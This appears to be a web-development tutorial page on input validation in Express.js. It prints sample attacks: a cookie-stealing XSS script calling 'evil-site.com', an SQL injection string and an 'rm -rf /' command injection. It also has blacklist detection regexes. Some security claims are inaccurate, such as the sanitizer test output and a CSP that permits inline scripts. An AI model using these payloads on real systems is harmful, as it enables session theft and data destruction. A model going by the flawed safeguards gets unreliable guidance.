---
layout: default
title: Input Validation and Security
nav_order: 4
parent: Request Handling
---

# Input Validation and Security

[&laquo; Return to Request Handling Chapter](index.md)

## Introduction to Input Validation

When users submit data through forms or API requests, you can never trust that data completely. Malicious users might try to exploit your application by sending harmful data. Input validation and sanitization are essential security practices that protect your application from various attacks.

## Common Security Threats

### 1. Cross-Site Scripting (XSS)

XSS attacks occur when malicious scripts are injected into your application through user input. These scripts can:
- Steal user session cookies
- Redirect users to malicious sites
- Modify page content
- Access sensitive information

**Example of XSS attack:**
```html
<!-- Malicious input -->
<script>alert('XSS Attack!');</script>

<!-- Or more dangerous -->
<script>
    document.location = 'http://evil-site.com/steal?cookie=' + document.cookie;
</script>
```

### 2. SQL Injection

SQL injection occurs when malicious SQL code is inserted into input fields, potentially allowing attackers to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations

**Example of SQL injection:**
```javascript
// Dangerous code
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

// If username = "admin' OR '1'='1"
// Query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
// This would return all users!
```

### 3. Command Injection

Command injection occurs when user input is used to construct system commands without proper validation.

**Example:**
```javascript
// Dangerous code
const command = `ls ${userInput}`;
exec(command);

// If userInput = "; rm -rf /"
// This could delete files on the server!
```

## Input Validation Strategies

### 1. Whitelist Validation

Only allow known good values:

```javascript
function validateCountry(country) {
    const allowedCountries = ['us', 'ca', 'uk', 'au', 'de', 'fr'];
    return allowedCountries.includes(country.toLowerCase());
}

function validateGender(gender) {
    const allowedGenders = ['male', 'female', 'other', 'prefer-not-to-say'];
    return allowedGenders.includes(gender.toLowerCase());
}
```

### 2. Blacklist Validation

Block known bad values (less secure, use sparingly):

```javascript
function containsMaliciousContent(input) {
    const maliciousPatterns = [
        /<script/i,
        /javascript:/i,
        /on\w+\s*=/i,  // onclick, onload, etc.
        /eval\s*\(/i,
        /expression\s*\(/i
    ];
    
    return maliciousPatterns.some(pattern => pattern.test(input));
}
```

### 3. Data Type Validation

Ensure data matches expected types:

```javascript
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return typeof email === 'string' && emailRegex.test(email);
}

function validateAge(age) {
    const numAge = parseInt(age);
    return !isNaN(numAge) && numAge >= 0 && numAge <= 150;
}

function validatePhone(phone) {
    const phoneRegex = /^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;
    return typeof phone === 'string' && phoneRegex.test(phone);
}
```

### 4. Length and Format Validation

```javascript
function validateUsername(username) {
    if (typeof username !== 'string') return false;
    if (username.length < 3 || username.length > 20) return false;
    if (!/^[a-zA-Z0-9_]+$/.test(username)) return false;
    return true;
}

function validatePassword(password) {
    if (typeof password !== 'string') return false;
    if (password.length < 8) return false;
    if (!/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/.test(password)) return false;
    return true;
}
```

## Input Sanitization

Sanitization involves cleaning input data to remove or escape potentially harmful content:

### 1. HTML Sanitization

```javascript
function sanitizeHTML(input) {
    if (typeof input !== 'string') return '';
    
    return input
        // Remove HTML tags
        .replace(/<[^>]*>/g, '')
        // Escape HTML entities
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;')
        // Remove extra whitespace
        .trim();
}
```

### 2. SQL Injection Prevention

Use parameterized queries instead of string concatenation:

```javascript
// BAD - Vulnerable to SQL injection
const query = `SELECT * FROM users WHERE username = '${username}'`;

// GOOD - Using parameterized queries
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username], callback);
```

### 3. Command Injection Prevention

```javascript
// BAD - Vulnerable to command injection
const command = `ls ${userInput}`;
exec(command);

// GOOD - Validate and escape input
function validateFilename(filename) {
    return /^[a-zA-Z0-9._-]+$/.test(filename);
}

if (validateFilename(userInput)) {
    const command = `ls ${userInput}`;
    exec(command);
} else {
    throw new Error('Invalid filename');
}
```

## Complete Validation System

Let's create a comprehensive validation system:

```javascript
const express = require('express');
const app = express();
const PORT = 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Validation functions
class InputValidator {
    static sanitizeHTML(input) {
        if (typeof input !== 'string') return '';
        
        return input
            .replace(/<[^>]*>/g, '')
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/\//g, '&#x2F;')
            .trim();
    }
    
    static validateEmail(email) {
        if (typeof email !== 'string') return false;
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email) && email.length <= 254;
    }
    
    static validateName(name) {
        if (typeof name !== 'string') return false;
        const sanitized = this.sanitizeHTML(name);
        return sanitized.length >= 2 && sanitized.length <= 50 && /^[a-zA-Z\s'-]+$/.test(sanitized);
    }
    
    static validateAge(age) {
        const numAge = parseInt(age);
        return !isNaN(numAge) && numAge >= 0 && numAge <= 150;
    }
    
    static validatePhone(phone) {
        if (typeof phone !== 'string') return false;
        const phoneRegex = /^\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;
        return phoneRegex.test(phone);
    }
    
    static validateMessage(message) {
        if (typeof message !== 'string') return false;
        const sanitized = this.sanitizeHTML(message);
        return sanitized.length >= 10 && sanitized.length <= 1000;
    }
    
    static validateURL(url) {
        if (typeof url !== 'string') return false;
        try {
            const urlObj = new URL(url);
            return ['http:', 'https:'].includes(urlObj.protocol);
        } catch {
            return false;
        }
    }
    
    static validateCountry(country) {
        const allowedCountries = [
            'us', 'ca', 'uk', 'au', 'de', 'fr', 'jp', 'cn', 'in', 'br',
            'mx', 'es', 'it', 'nl', 'se', 'no', 'dk', 'fi', 'pl', 'ru'
        ];
        return allowedCountries.includes(country.toLowerCase());
    }
}

// Validation middleware
function validateContactForm(req, res, next) {
    const errors = [];
    const sanitizedData = {};
    
    // Sanitize and validate each field
    const { firstName, lastName, email, phone, age, message, website, country } = req.body;
    
    // First Name
    if (!firstName) {
        errors.push('First name is required');
    } else if (!InputValidator.validateName(firstName)) {
        errors.push('First name must be 2-50 characters and contain only letters, spaces, hyphens, and apostrophes');
    } else {
        sanitizedData.firstName = InputValidator.sanitizeHTML(firstName);
    }
    
    // Last Name
    if (!lastName) {
        errors.push('Last name is required');
    } else if (!InputValidator.validateName(lastName)) {
        errors.push('Last name must be 2-50 characters and contain only letters, spaces, hyphens, and apostrophes');
    } else {
        sanitizedData.lastName = InputValidator.sanitizeHTML(lastName);
    }
    
    // Email
    if (!email) {
        errors.push('Email is required');
    } else if (!InputValidator.validateEmail(email)) {
        errors.push('Please provide a valid email address');
    } else {
        sanitizedData.email = email.toLowerCase().trim();
    }
    
    // Phone (optional)
    if (phone && !InputValidator.validatePhone(phone)) {
        errors.push('Please provide a valid phone number (e.g., 123-456-7890)');
    } else if (phone) {
        sanitizedData.phone = phone.trim();
    }
    
    // Age (optional)
    if (age && !InputValidator.validateAge(age)) {
        errors.push('Age must be a number between 0 and 150');
    } else if (age) {
        sanitizedData.age = parseInt(age);
    }
    
    // Message
    if (!message) {
        errors.push('Message is required');
    } else if (!InputValidator.validateMessage(message)) {
        errors.push('Message must be 10-1000 characters long');
    } else {
        sanitizedData.message = InputValidator.sanitizeHTML(message);
    }
    
    // Website (optional)
    if (website && !InputValidator.validateURL(website)) {
        errors.push('Please provide a valid URL (must start with http:// or https://)');
    } else if (website) {
        sanitizedData.website = website.trim();
    }
    
    // Country (optional)
    if (country && !InputValidator.validateCountry(country)) {
        errors.push('Please select a valid country');
    } else if (country) {
        sanitizedData.country = country.toLowerCase();
    }
    
    // Check for malicious content
    const allInput = Object.values(req.body).join(' ');
    if (containsMaliciousContent(allInput)) {
        errors.push('Input contains potentially malicious content');
    }
    
    if (errors.length > 0) {
        return res.status(400).json({
            success: false,
            errors: errors
        });
    }
    
    // Add sanitized data to request object
    req.sanitizedData = sanitizedData;
    next();
}

// Function to detect malicious content
function containsMaliciousContent(input) {
    const maliciousPatterns = [
        /<script[^>]*>.*?<\/script>/gi,
        /javascript:/gi,
        /on\w+\s*=/gi,
        /eval\s*\(/gi,
        /expression\s*\(/gi,
        /vbscript:/gi,
        /data:text\/html/gi,
        /<iframe[^>]*>/gi,
        /<object[^>]*>/gi,
        /<embed[^>]*>/gi
    ];
    
    return maliciousPatterns.some(pattern => pattern.test(input));
}

// Routes
app.get('/contact', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Contact Form</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
                .form-group { margin-bottom: 15px; }
                label { display: block; margin-bottom: 5px; font-weight: bold; }
                input, textarea, select { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
                button { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
                .error { color: #dc3545; font-size: 14px; margin-top: 5px; }
                .success { color: #28a745; font-size: 14px; margin-top: 5px; }
            </style>
        </head>
        <body>
            <h1>Contact Form</h1>
            <form action="/contact" method="POST">
                <div class="form-group">
                    <label for="firstName">First Name *</label>
                    <input type="text" id="firstName" name="firstName" required>
                </div>
                
                <div class="form-group">
                    <label for="lastName">Last Name *</label>
                    <input type="text" id="lastName" name="lastName" required>
                </div>
                
                <div class="form-group">
                    <label for="email">Email *</label>
                    <input type="email" id="email" name="email" required>
                </div>
                
                <div class="form-group">
                    <label for="phone">Phone</label>
                    <input type="tel" id="phone" name="phone" placeholder="123-456-7890">
                </div>
                
                <div class="form-group">
                    <label for="age">Age</label>
                    <input type="number" id="age" name="age" min="0" max="150">
                </div>
                
                <div class="form-group">
                    <label for="website">Website</label>
                    <input type="url" id="website" name="website" placeholder="https://example.com">
                </div>
                
                <div class="form-group">
                    <label for="country">Country</label>
                    <select id="country" name="country">
                        <option value="">Select a country</option>
                        <option value="us">United States</option>
                        <option value="ca">Canada</option>
                        <option value="uk">United Kingdom</option>
                        <option value="au">Australia</option>
                        <option value="de">Germany</option>
                        <option value="fr">France</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="message">Message *</label>
                    <textarea id="message" name="message" rows="4" required></textarea>
                </div>
                
                <button type="submit">Submit</button>
            </form>
        </body>
        </html>
    `);
});

// Handle form submission with validation
app.post('/contact', validateContactForm, (req, res) => {
    const data = req.sanitizedData;
    
    // Log the sanitized data
    console.log('=== Validated Contact Form Submission ===');
    console.log('Name:', `${data.firstName} ${data.lastName}`);
    console.log('Email:', data.email);
    console.log('Phone:', data.phone || 'Not provided');
    console.log('Age:', data.age || 'Not provided');
    console.log('Website:', data.website || 'Not provided');
    console.log('Country:', data.country || 'Not provided');
    console.log('Message:', data.message);
    console.log('=========================================');
    
    // In a real application, you would save to database here
    
    res.json({
        success: true,
        message: 'Form submitted successfully',
        data: {
            name: `${data.firstName} ${data.lastName}`,
            email: data.email,
            submittedAt: new Date().toISOString()
        }
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error'
    });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log('Visit http://localhost:3000/contact to test the form');
});
```

## Security Best Practices

### 1. Always Validate on the Server

Client-side validation can be bypassed, so always validate on the server:

```javascript
// Client-side validation (can be bypassed)
if (email.includes('@')) {
    // Submit form
}

// Server-side validation (secure)
if (InputValidator.validateEmail(email)) {
    // Process data
}
```

### 2. Use HTTPS

Always use HTTPS in production to encrypt data in transit:

```javascript
// Force HTTPS in production
if (process.env.NODE_ENV === 'production') {
    app.use((req, res, next) => {
        if (req.header('x-forwarded-proto') !== 'https') {
            res.redirect(`https://${req.header('host')}${req.url}`);
        } else {
            next();
        }
    });
}
```

### 3. Rate Limiting

Implement rate limiting to prevent abuse:

```bash
npm install express-rate-limit
```

```javascript
const rateLimit = require('express-rate-limit');

const contactLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // Limit each IP to 5 requests per windowMs
    message: 'Too many contact form submissions, please try again later.'
});

app.post('/contact', contactLimiter, validateContactForm, (req, res) => {
    // Handle form submission
});
```

### 4. Content Security Policy

Set up CSP headers to prevent XSS:

```javascript
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', 
        "default-src 'self'; " +
        "script-src 'self' 'unsafe-inline'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data: https:;"
    );
    next();
});
```

### 5. Input Length Limits

Set reasonable limits on input length:

```javascript
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));
```

## Testing Your Validation

Create test cases to ensure your validation works:

```javascript
// Test validation functions
function testValidation() {
    console.log('Testing email validation:');
    console.log('Valid email:', InputValidator.validateEmail('test@example.com')); // true
    console.log('Invalid email:', InputValidator.validateEmail('invalid-email')); // false
    
    console.log('\nTesting name validation:');
    console.log('Valid name:', InputValidator.validateName('John Doe')); // true
    console.log('Invalid name:', InputValidator.validateName('John123')); // false
    
    console.log('\nTesting HTML sanitization:');
    console.log('Sanitized:', InputValidator.sanitizeHTML('<script>alert("xss")</script>Hello')); // "Hello"
}

testValidation();
```

## Common Validation Mistakes

1. **Trusting client-side validation only** - Always validate on the server
2. **Not sanitizing output** - Sanitize data before displaying it
3. **Using blacklists instead of whitelists** - Whitelists are more secure
4. **Not validating file uploads** - Check file types and sizes
5. **Storing sensitive data in plain text** - Hash passwords and encrypt sensitive data

## Next Steps

Now that you understand input validation and security, you're ready to learn how to store and retrieve data from files based on user requests. This will allow you to build persistent applications that remember user data.

**[Next: Filesystem Operations →](filesystemOperations.md)**
